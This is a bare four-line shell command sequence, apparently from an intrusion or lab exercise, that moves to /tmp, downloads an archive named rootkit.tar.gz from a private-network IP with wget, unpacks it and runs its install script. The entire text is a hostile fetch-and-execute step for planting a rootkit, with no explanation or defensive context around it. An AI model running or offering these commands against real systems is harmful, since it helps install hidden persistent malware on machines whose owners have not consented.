cd /tmp
wget http://192.168.224.128/rootkit.tar.gz
tar xzf rootkit.tar.gz
./install.sh
